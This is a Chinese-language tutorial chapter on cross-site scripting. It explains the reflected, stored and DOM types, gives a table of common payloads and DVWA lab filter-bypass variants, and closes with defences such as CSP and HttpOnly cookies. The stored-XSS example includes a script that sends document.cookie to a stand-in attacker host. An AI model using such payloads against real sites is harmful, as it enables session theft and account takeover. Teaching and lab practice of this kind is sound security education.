# Chapter 4: XSS 跨站脚本攻击

## 4.1 XSS 简介

XSS (Cross-Site Scripting) 跨站脚本攻击，是一种代码注入攻击。攻击者通过在网页中注入恶意 JavaScript 代码，当用户访问被注入恶意代码的页面时，攻击者的脚本会在用户浏览器中执行。

## 4.2 XSS 类型

### 4.2.1 反射型 XSS

反射型 XSS 是非持久化的攻击，恶意代码作为用户请求的一部分提交到服务器，服务器未经处理地将恶意代码反射回浏览器。

**特点：**
- 需要欺骗用户点击恶意链接
- 恶意代码不存储在服务器端
- 常见于搜索功能

**攻击示例：**
```
http://example.com/search?q=<script>alert('XSS')</script>
```

### 4.2.2 存储型 XSS

存储型 XSS 是持久化攻击，恶意代码被永久存储在目标服务器端。

**特点：**
- 恶意代码存储在服务器端
- 影响所有访问该页面的用户
- 常见于留言板、评论区

**攻击示例：**
在评论区提交：`<script>document.location='http://attacker.com?cookie='+document.cookie</script>`

### 4.2.3 DOM 型 XSS

DOM 型 XSS 不需要服务器参与，完全在客户端通过 DOM 操作触发。

**特点：**
- 恶意代码在客户端执行
- 不经过服务器
- 基于 JavaScript 的 DOM 操作

**攻击示例：**
```javascript
// 页面中的 JS 代码
var pos = document.URL.indexOf("msg=") + 4;
var msg = document.URL.substring(pos, document.URL.length);
document.write(msg);
```

恶意 URL：`http://example.com/page.html?msg=<script>alert('XSS')</script>`

## 4.3 XSS 常用攻击向量

| 类型 | 代码 | 说明 |
|------|------|------|
| 弹窗测试 | `<script>alert('XSS')</script>` | 最基本的测试 |
| 图片触发 | `<img src=x onerror=alert('XSS')>` | 图片错误时触发 |
| 事件触发 | `<svg onload=alert('XSS')>` | SVG 加载时触发 |
| iframe 嵌入 | `<iframe src="javascript:alert('XSS')">` | iframe 触发 |
| 钓鱼链接 | `<a href="javascript:alert('XSS')">点击</a>` | 伪链接点击 |

## 4.4 XSS 实战靶场

### DVWA XSS 练习

**Low 级别：**
```bash
# 直接注入
<script>alert('XSS')</script>
```

**Medium 级别：**
```bash
# 大小写混合
<ScRiPt>alert('XSS')</sCrIpT>
# 双重标签
<script>alert('XSS')</script><script>alert('XSS')</script>
```

**High 级别：**
```bash
# 利用 DOM
<img src="x" onerror="alert('XSS')">
```

## 4.5 XSS 防御

### 4.5.1 输入过滤
- 对用户输入进行严格验证
- 过滤特殊字符

### 4.5.2 输出编码
- HTML 实体编码
- JavaScript 转义
- URL 编码

### 4.5.3 内容安全策略 (CSP)
```http
Content-Security-Policy: script-src 'self'
```

### 4.5.4 HttpOnly Cookie
```php
setcookie("session", $value, 0, "/", "", true, true);
```

### 4.5.5 防御总结

| 防御措施 | 说明 |
|----------|------|
| 输入验证 | 严格验证用户输入 |
| 输出编码 | 根据上下文适当编码 |
| CSP | 限制脚本来源 |
| HttpOnly | 防止 Cookie 被窃取 |
| WAF | Web 应用防火墙 |
